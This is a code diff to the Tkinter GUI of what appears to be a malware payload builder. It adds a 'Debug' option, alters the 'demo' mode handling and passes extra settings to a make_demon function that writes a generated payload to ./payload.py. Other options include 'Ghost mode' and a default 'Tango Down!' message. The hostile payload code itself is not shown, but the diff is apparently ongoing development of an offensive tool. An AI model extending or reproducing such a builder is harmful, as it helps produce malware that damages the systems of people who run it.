@@ -152,6 +152,7 @@ class MainWindow(Tk):
             'msg' : StringVar(),
             'new_msg' : StringVar(),
             'img_base64' : StringVar(),
+            'debug' : IntVar(),
         }
 
 
@@ -168,6 +169,7 @@ class MainWindow(Tk):
         self.options['mode'].set(1)
         self.options['demo'].set(0)
         self.options['ghost'].set(0)
+        self.options['debug'].set(0)
 
         self.options['msg'].set('''Tango Down!
 
@@ -533,6 +535,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         options_frame.grid(row = 1, column = 0)
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
         Checkbutton(options_frame, text = 'Ghost mode', variable = self.options['ghost'], onvalue = 1, offvalue = 0).grid(row = 0, column = 1)
+        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0)
 
         content_frame = LabelFrame(self.gen, text = 'Content')
         content_frame.grid(row = 1, column = 1)
@@ -573,8 +576,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
-            self.options['demo'].set(0)
-            messagebox.showwarning('Disabled', 'Fullscreen and Demo mode are available for GUI mode only, these options have been automaticly disabled!')
+            #messagebox.showwarning('Disabled', 'Fullscreen is available for GUI mode only, this option have been disabled!')
 
     def make_demon(self):
         try:
@@ -584,7 +586,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['demo'].get(),
                 self.options['ghost'].get(),
                 self.options['msg'].get(),
-                self.options['img_base64'].get())
+                self.options['img_base64'].get(),
+                self.options['mode'].get(),
+                self.options['debug'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
